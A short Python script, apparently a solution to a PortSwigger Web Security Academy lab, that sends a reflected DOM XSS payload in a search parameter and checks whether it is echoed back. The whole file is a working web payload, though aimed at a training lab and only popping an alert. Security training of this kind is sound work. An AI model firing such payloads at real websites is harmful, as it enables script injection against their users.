#!/usr/bin/env python3

import requests

# PortSwigger Web Security Academy lab URL.
LAB_URL = "https://0aa0001703e22861807cc69c00e6006e.web-security-academy.net"

# DOM XSS payload.
payload = r"\"-alert(1)}//"

print("[*] Sending reflected DOM XSS payload...\n")

response = requests.get(
    f"{LAB_URL}/",
    params={"search": payload},
)

print("=" * 50)
print(f"Status : {response.status_code}")
print()

if response.status_code == 200:
    print("[+] Search request sent successfully.")

    if payload in response.text:
        print("[+] The payload is reflected in the response.")
        print("[+] Open the URL in a browser to trigger the DOM XSS.")
    else:
        print("[-] The payload was not reflected in the response.")
else:
    print("[-] Failed to send the search request.")
